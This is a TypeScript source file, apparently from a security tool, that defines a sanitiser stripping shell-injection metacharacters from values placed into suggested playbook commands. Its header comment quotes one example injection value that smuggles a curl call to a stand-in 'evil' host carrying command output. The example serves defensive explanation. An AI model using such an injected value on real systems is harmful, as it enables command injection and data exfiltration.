// ============================================================
// Overwatch — Playbook command-construction safety
// ============================================================
//
// Playbook tools EMIT shell command strings the operator may copy into
// run_bash. Several interpolate attacker-influenced values — a parsed IAM
// principal (cred_user / STS ARN), an operator-supplied repo / region /
// client_id / scope — directly into those strings. Without fencing, a value
// like `admin; curl https://evil/$(id)` injects a second command when the
// operator runs the step.
//
// `safePlaybookArg` neutralizes shell-injection metacharacters in ANY quoting
// context (bare, single-, or double-quoted): it strips the characters that can
// start a new command, run a substitution, or break out of a quote, while
// keeping ordinary identifier / URL / scope characters. A space is intentionally
// KEPT — at worst it adds a stray argument to the SAME command, never starts a
// new one — so multi-value scopes and the like still render.

// Chars that enable command injection / quote breakout across contexts:
//   ` $  command substitution / expansion
//   ; | & < > ( ) { }  command separators, redirects, subshells, groups
//   ' "  quote breakout
//   \  escape
//   * ? [ ]  globbing (bare context)
//   ! #  history expansion / comment
//   \r \n \t \v \f  control / newline (also breaks `#`-commented probes)
const SHELL_INJECT_CHARS = /[`$;|&<>(){}[\]\\'"*?!#\r\n\t\v\f]/g;

/**
 * Strip shell-injection metacharacters from a value before interpolating it into
 * an emitted playbook command string. Attacker-influenced values (parsed IAM
 * principals, operator-supplied repos/regions/client_ids/scopes) MUST go through
 * this so a suggested command can't be turned into a second command when run.
 */
export function safePlaybookArg(v: unknown): string {
  return String(v ?? '').replace(SHELL_INJECT_CHARS, '');
}
